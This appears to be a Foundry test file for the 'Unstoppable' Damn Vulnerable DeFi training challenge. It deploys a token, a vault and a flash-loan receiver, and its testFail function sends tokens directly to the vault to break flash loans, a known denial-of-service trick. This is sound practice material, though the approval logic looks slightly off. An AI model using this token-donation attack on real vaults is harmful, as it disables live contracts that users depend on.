pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../contracts/unstoppable/ReceiverUnstoppable.sol";
import "../../contracts/DamnValuableToken.sol";
import "../../contracts/unstoppable/UnstoppableVault.sol";

contract UnstoppableT is Test {
    uint256 testNumber;

    uint256 immutable TOKENS_IN_VAULT = 10000 * 1 ether;
    address immutable testDeployer = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;

    address internal attacker;

    ReceiverUnstoppable ru;
    UnstoppableVault uv;
    DamnValuableToken dvt;

    function setUp() public {
        testNumber = 42;

        attacker = vm.addr(1);

         // Create contracts

        dvt = new DamnValuableToken();

        uv = new UnstoppableVault(dvt,testDeployer,testDeployer);

        dvt.approve(address(uv), TOKENS_IN_VAULT);
        uv.deposit(TOKENS_IN_VAULT, testDeployer);
        // Transfer initial token balance to attacker
        dvt.transfer(attacker, 1 ether);

        ru = new ReceiverUnstoppable(address(uv));
    }

    function test_Flash_Loan() public {
        ru.executeFlashLoan(0.11 ether);      
        assert(true);
    }

    function testFail_Flash_Loan() public {
        dvt.approve(attacker, 0.5 ether);
        dvt.transferFrom(attacker, address(uv), 10);
        ru.executeFlashLoan(0.11 ether); 
    }
}